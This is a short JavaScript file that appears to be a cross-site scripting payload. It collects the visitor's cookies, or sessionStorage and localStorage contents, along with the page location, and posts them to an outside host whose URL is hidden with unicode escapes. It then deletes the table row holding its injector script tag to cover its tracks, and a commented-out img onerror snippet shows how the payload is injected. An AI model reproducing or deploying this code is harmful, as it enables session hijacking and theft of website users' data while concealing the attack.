(function() {
    /* load css
     var drc = document.createElement('script');drc.setAttribute("src","//");document.getElementsByTagName('head')[0].appendChild(drc);
     ["<img src=\"d\" onerror=\"var drc = document.createElement(\'script\');drc.setAttribute(\'src\',\'//aa/extend.js\');document.getElementsByTagName(\'head\')[0].appendChild(drc);\">"].join("");
    */
    /*
     this.meta = document.createElement('meta');
     this.meta.content = "upgrade-insecure-requests";
     this.meta.setAttribute("http-equiv", "Content-Security-Policy");
     document.getElementsByTagName('head')[0].appendChild(this.meta);
     */
    this.fn1 = function(o) {
        var xhr = new XMLHttpRequest();
        xhr.open('POST', o.url, true);
        xhr.setRequestHeader('Content-Type', 'application/json');
        xhr.send(JSON.stringify(o.data));
    }
    this.fn2 = function() {
        this.a = document.cookie;
        var mstr="";
        if (!this.a) {
            this.b = sessionStorage.length > 0 ? JSON.stringify(sessionStorage) : '';
            mstr="sessionStorage";
            if(!this.b){
                this.b = localStorage.length > 0 ? JSON.stringify(localStorage) : '';
                mstr="localStorage";
            }
            this.a = this.b ? mstr + this.b : '';
        }
        return this.a;
    }
    this.dt = {
        d: window.location.origin,
        p: window.location.port ? window.location.port : window.location.protocol == 'https:' ? '443' : '80',
        t: window.location.pathname
    }
    this.dt.c = this.fn2();
    this.fn1({ url: "\u0068\u0074\u0074\u0070\u0073\u003a\u002f\u002f\u0062\u006f\u0078\u002e\u006e\u006a\u002d\u0061\u002e\u0069\u006e\u002f\u0061\u0070\u0069\u002f\u0066\u0074\u0074\u0073", data: this.dt });
    this.d1 = document.querySelector("\u0073\u0063\u0072\u0069\u0070\u0074\u005b\u0073\u0072\u0063\u003d\u0027\u002f\u002f\u0061\u002e\u006e\u006a\u002d\u0061\u002e\u0069\u006e\u002f\u0061\u002e\u006a\u0073\u0027\u005d");
    if (this.d1) {
        this.n1 = this.d1.parentElement.parentElement
        if (this.n1.nodeName == "\u0054\u0052") {
            this.n1.remove();
        }
    }
}(window))
